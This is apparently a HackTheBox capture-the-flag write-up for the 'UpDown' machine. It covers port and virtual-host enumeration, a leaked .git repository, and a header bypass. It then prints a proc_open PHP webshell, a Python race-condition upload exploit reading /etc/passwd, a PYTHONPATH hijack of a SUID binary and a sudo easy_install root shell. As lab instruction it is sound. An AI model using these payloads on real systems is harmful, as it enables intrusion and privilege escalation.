---
description: UpDown box from HackTheBox write up.
---

# UpDown

## Nmap

An Nmap scan reveals that the server only have SSH and Apache running. I will take a look to Apache first since the SSH version looks more or less updated.

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap 10.10.11.177 -p- --min-rate=1000
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-25 15:19 EDT
Nmap scan report for 10.10.11.177
Host is up (0.053s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 18.72 seconds
```

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -p22,80 10.10.11.177
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-25 15:21 EDT
Nmap scan report for 10.10.11.177
Host is up (0.047s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)
|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)
|_  256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Is my Website up ?
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.57 seconds
```

## Port 80

### Enumerating

A page to check if a site is up or not. I can see the domain for the site so I will add it to my host file: `siteisup.htb` just in case.

The application is maybe using CURL or something similar to check for sites status according with the information the de debug mode shows. I will launch a directory scan just in case I can find something more, looks like the server is using PHP files so I will look for them in the scan too:

```bash
┌──(kali㉿kali)-[~]
└─$ feroxbuster -u http://siteisup.htb/ -w Wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://siteisup.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ Wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       40l       93w     1131c http://siteisup.htb/
403      GET        9l       28w      277c http://siteisup.htb/.php
200      GET       40l       93w     1131c http://siteisup.htb/index.php
301      GET        9l       28w      310c http://siteisup.htb/dev => http://siteisup.htb/dev/
200      GET        0l        0w        0c http://siteisup.htb/dev/index.php
403      GET        9l       28w      277c http://siteisup.htb/server-status
[####################] - 8m    882184/882184  0s      found:6       errors:4      
[####################] - 8m    441092/441092  871/s   http://siteisup.htb/ 
[####################] - 8m    441092/441092  871/s   http://siteisup.htb/dev 
```

The `dev` directory is returning just and empty response, I also found a dev virtual host but Im getting a 403 error trying to access it:

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster vhost -u http://siteisup.htb -w ~/Wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://siteisup.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /home/kali/Wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/09/25 16:17:19 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.siteisup.htb (Status: 403) [Size: 281]
```

Trying things here and there I found a git repository in the `dev` directory: `http://siteisup.htb/dev/.git`. I dumped all the repository (thanks [git-dumper](https://github.com/arthaud/git-dumper){:target="_blank"}) and got access to some source files, looks like an developer admin site thing.

According to the commits, looks like this site is hosted in the dev virtual host we found earlier. To bypass the protection we need to add a special header as we can see in the `.htaccess` file:

```
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
```

### Dev site and RCE

Adding the header `Special-Dev` with the value `only4dev` allow us to get into the `dev.siteisup.htb`, I used Burpsuite to make sure my browser requests get the header. Looks like this site includes a functionality to upload a file for checking sites in bulk, obviously it is filtering what we can upload but remember we have the code for it so time to find a bypass!

 The code reveals that some extentions that could be executed are allowed so the only problem now is to get to the file before it gets deleted. According to the source code, when a file is uploaded, the application takes that file and put it in a directory inside the uploads folder. The directory name is the MD5 hash of the unix timestamp, an example: `uploads/MD5(time())/evil.phar`. After cheking all the URLs in the file the application deletes it.

I noticed that the page hangs if you try to check a non-existent page so adding some fake URLs to the uploaded file should give us some time to get to it. To automate the process of uploading and getting the file I used a Python script (I will show it later) with the `threading` library to make sure I can execute code while the file POST request is waiting for all my fake URLs to be checked.

I tried some extentions to check what I can use to get code execution and `.phar` did the trick, I noticed something though. Check this payload and the answer:

```php
http://www.justheretowintherace.com/
<?php
    echo "Hello World";
    echo ini_get("disable_functions");
?>
```

```
http://www.justheretowintherace.com/
Hello Worldpcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,error_log,system,exec,shell_exec,popen,passthru,link,symlink,syslog,ld,mail,stream_socket_sendto,dl,stream_socket_client,fsockopen
```

As you can see, there are a lot of blocked functions, including typical functions used to get a webshell. I spent some time reading PHP documentation until I found `proc_open`, the PHP documentation even included a cool example I used as base to craft this payload:

```php
http://www.justheretowintherace.com/
<?php
    echo "Running code...\n";

    $command = 'id';
    if(isset($_GET['cmd'])) {
        $command = $_GET['cmd'];
    }
    $descriptorspec = array(
       0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
       1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
       2 => array("pipe", "w")   // stdout is a pipe that the child will write to
    );
    $cwd = '/tmp';

    $process = proc_open($command, $descriptorspec, $pipes, $cwd);

    if (is_resource($process)) {
        fclose($pipes[0]);

        echo stream_get_contents($pipes[1]);
        fclose($pipes[1]);

        echo stream_get_contents($pipes[2]);
        fclose($pipes[2]);

        proc_close($process);
    }
?>
```

Also, I added some modifications to my Python script to improve it and make sure I could sent custom commands to the uploaded file:

```python
import requests, time, hashlib, threading
from urllib.parse import quote


url = 'http://dev.siteisup.htb'
file_name = 'rce.phar'
command = 'cat /etc/passwd'
headers = { 'Special-Dev' : 'only4dev' }
fail = False

def race_for_webshell():
    command_executed = False
    while not command_executed  and not fail:
        predicted_folder_name = hashlib.md5(str(int(time.time())).encode()).hexdigest()
        response = requests.get(f'{url}/uploads/{predicted_folder_name}/{file_name}?cmd={quote(command)}', headers=headers)
        if(response.ok):
            print()
            print(response.content.decode())
            command_executed = True
        else:
            print(f'Failed {response.status_code}: uploads/{predicted_folder_name}/{file_name}')
            time.sleep(0.5)

with open(file_name, 'rb') as file_to_upload:
    files = { 'file': file_to_upload }
    data = { 'check': 'Check' }

    print('Uploading Webshell and starting the race...')
    thread = threading.Thread(target=race_for_webshell)
    thread.start()
    response = requests.post(url, files=files, data=data, headers=headers)
    if 'Extension not allowed!' in response.content.decode():
        print('Extension not allowed!')
        fail = True
    thread.join()
```

This is the result of our exploit:

```bash
┌──(kali㉿kali)-[~/Desktop/exploit]
└─$ python3 exploit.py               
Uploading Webshell and starting the race...
Failed 404: uploads/47e6ed8a191edae5ec33d6ba6e5e7373/rce.phar

http://www.justheretowintherace.com/
Running code...
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
developer:x:1002:1002::/home/developer:/bin/bash
```

We have RCE!! Getting a reverse shell now is trivial.

## Inside the machine as `www-data`

Once in the machine I started checking things here and there and this called my attention:

```bash
www-data@updown:/home/developer/dev$ ls -l
total 24
-rwsr-x--- 1 developer www-data 16928 Jun 22 15:45 siteisup
-rwxr-x--- 1 developer www-data   154 Jun 22 15:45 siteisup_test.py
```

```python
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
    print "Website is up"
else:
    print "Website is down"
```

The binary is a SUID binary owned by the user `developer` so if we can control the execution of it we could impersonate that user. Testing both the binary and the Python script looks like the binary was compiled from the Python script (or at least a really similar one).

Checking a bit the Python [documentation](https://docs.python.org/2/tutorial/modules.html#the-module-search-path){:target="_blank"}, I found that before checking for installed modules in the typical installation directories, Python will try to check both the current directory and also the `PYTHONPATH` environment variable trying to find the requested module. We can't write in the directory where this script is located but we can set that environment variable and point it to a directory we control:

```bash
export PYTHONPATH=/tmp
```

Now we create a file called `requests.py` in the `/tmp` directory with this content:

```python
import pty

pty.spawn("/bin/sh")
```

Everythinng is ready now, we can execute the binary to start impersonating the `developer` user!

```bash
www-data@updown:/tmp$ /home/developer/dev/siteisup
Welcome to 'siteisup.htb' application

$ id
uid=1002(developer) gid=33(www-data) groups=33(www-data)
```

I will steal the user SSH key and jump to a more stable shell, by the way the user flag is under `/home/developer/user.txt`.

## Pwn time!

Getting `root` was pretty easy, the user is allowed to execute `easy_install` as `root` without any password:

```bash
developer@updown:~$ sudo -l
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install
```

[Gtfobins](https://gtfobins.github.io/){:target="_blank"} is your friend:

```bash
developer@updown:~$ TF=$(mktemp -d)
developer@updown:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
developer@updown:~$ sudo easy_install $TF
WARNING: The easy_install command is deprecated and will be removed in a future version.
Processing tmp.M1s5pktFwH
Writing /tmp/tmp.M1s5pktFwH/setup.cfg
Running setup.py -q bdist_egg --dist-dir /tmp/tmp.M1s5pktFwH/egg-dist-tmp-lsOvGP
# id
uid=0(root) gid=0(root) groups=0(root)
# bash
root@updown:/tmp/tmp.M1s5pktFwH#
```

The flag is under `/root/root.txt`.
